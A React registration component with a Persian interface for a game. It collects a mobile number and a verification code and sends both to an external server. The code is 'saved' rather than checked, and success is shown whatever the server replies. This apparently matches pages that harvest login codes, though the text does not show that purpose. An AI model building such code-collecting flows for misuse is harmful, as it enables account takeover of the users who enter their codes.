import { useState } from "react";
import { motion, AnimatePresence } from "framer-motion";

export default function Register() {
  const [step, setStep] = useState(0);
  const [phone, setPhone] = useState("");
  const [code, setCode] = useState("");
  const [loading, setLoading] = useState(false);

  const onlyNumbers = (value, max) => {
    return value.replace(/\D/g, "").slice(0, max);
  };

  const sendPhone = async () => {
    console.log("SEND PHONE CLICKED");

    if (phone.length !== 11 || !phone.startsWith("09")) {
      alert("شماره معتبر نیست");
      return;
    }

    setLoading(true);

    try {
      const res = await fetch(
        "https://khafan-site.onrender.com/phone",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            phone,
          }),
        }
      );

      console.log("STATUS:", res.status);

      const data = await res.json();

      console.log("RESPONSE:", data);

      localStorage.setItem("userId", data.id);

      setLoading(false);
      setStep(2);

    } catch (err) {
      console.error(err);
      setLoading(false);
      alert("خطا در اتصال به سرور");
    }
  };

  const verifyCode = async () => {
    const userId = localStorage.getItem("userId");

    if (!userId) {
      alert("شناسه کاربر پیدا نشد");
      return;
    }

    if (code.length < 4) {
      alert("کد معتبر نیست");
      return;
    }

    setLoading(true);

    try {
      const res = await fetch(
        `https://khafan-site.onrender.com/code/${userId}`,
        {
          method: "PUT",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            code,
          }),
        }
      );

      console.log("CODE STATUS:", res.status);

      const data = await res.json();

      console.log("CODE RESPONSE:", data);

      setLoading(false);
      setStep(3);

    } catch (err) {
      console.error(err);
      setLoading(false);
      alert("خطا در ذخیره کد");
    }
  };

  return (
    <div className="container">
      <AnimatePresence mode="wait">

        {step === 0 && (
          <motion.div
            key="start"
            className="card"
            initial={{ opacity: 0, scale: 0.8 }}
            animate={{ opacity: 1, scale: 1 }}
          >
            <h1>ورود به بازی</h1>

            <button
              className="btn"
              onClick={() => setStep(1)}
            >
              ثبت نام
            </button>
          </motion.div>
        )}

        {step === 1 && (
          <motion.div
            key="phone"
            className="card"
            initial={{ x: 200, opacity: 0 }}
            animate={{ x: 0, opacity: 1 }}
          >
            <h2>ثبت شماره موبایل</h2>

            <input
              type="tel"
              placeholder="09928532443"
              value={phone}
              maxLength={11}
              onChange={(e) =>
                setPhone(
                  onlyNumbers(
                    e.target.value,
                    11
                  )
                )
              }
            />

            <button
              className="btn"
              onClick={sendPhone}
            >
              ارسال کد
            </button>
          </motion.div>
        )}

        {step === 2 && (
          <motion.div
            key="code"
            className="card"
            initial={{ x: -200, opacity: 0 }}
            animate={{ x: 0, opacity: 1 }}
          >
            <h2>کد تایید را وارد کنید</h2>

            <input
              value={code}
              maxLength={6}
              placeholder="کد تایید"
              onChange={(e) =>
                setCode(
                  onlyNumbers(
                    e.target.value,
                    6
                  )
                )
              }
            />

            <button
              className="btn"
              onClick={verifyCode}
            >
              تایید
            </button>
          </motion.div>
        )}

        {step === 3 && (
          <motion.div
            key="done"
            className="card"
            initial={{ scale: 1.2, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
          >
            <h2>ثبت نام شما انجام شد</h2>
            <p>در حال ورود به بازی...</p>
          </motion.div>
        )}

      </AnimatePresence>

      {loading && (
        <div className="overlay">
          <div className="loader"></div>
        </div>
      )}
    </div>
  );
}